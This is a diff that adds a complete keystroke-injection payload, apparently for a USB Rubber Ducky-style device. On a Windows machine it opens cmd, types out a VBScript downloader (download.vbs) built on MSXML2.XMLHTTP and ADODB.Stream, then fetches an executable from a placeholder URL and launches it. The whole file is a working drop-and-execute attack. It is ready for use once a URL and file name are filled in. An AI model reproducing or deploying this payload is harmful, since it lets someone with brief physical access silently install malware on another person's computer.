@@ -1,0 +1,60 @@
+DELAY 1000
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy con download.vbs
+DELAY 500
+ENTER
+DELAY 500
+STRING Set args = WScript.Arguments:a = split(args(0), "/")(UBound(split(args(0),"/")))
+DELAY 500
+ENTER
+DELAY 500
+STRING Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"):objXMLHTTP.open "GET", args(0), false:objXMLHTTP.send()
+DELAY 500
+ENTER
+DELAY 500
+STRING If objXMLHTTP.Status = 200 Then
+DELAY 500
+ENTER
+DELAY 500
+STRING Set objADOStream = CreateObject("ADODB.Stream"):objADOStream.Open
+DELAY 500
+ENTER
+DELAY 500
+STRING objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0
+DELAY 500
+ENTER
+DELAY 500
+STRING Set objFSO = Createobject("Scripting.FileSystemObject"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a
+DELAY 500
+ENTER
+DELAY 500
+STRING objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing
+DELAY 500
+ENTER
+DELAY 500
+STRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing
+DELAY 500
+ENTER
+DELAY 500
+CTRL z
+DELAY 500
+ENTER
+DELAY 500
+STRING cscript download.vbs <INSERT URL HERE>
+DELAY 500
+ENTER
+DELAY 500
+STRING <INSERT EXE FILENAME HERE>
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 500
+ENTER
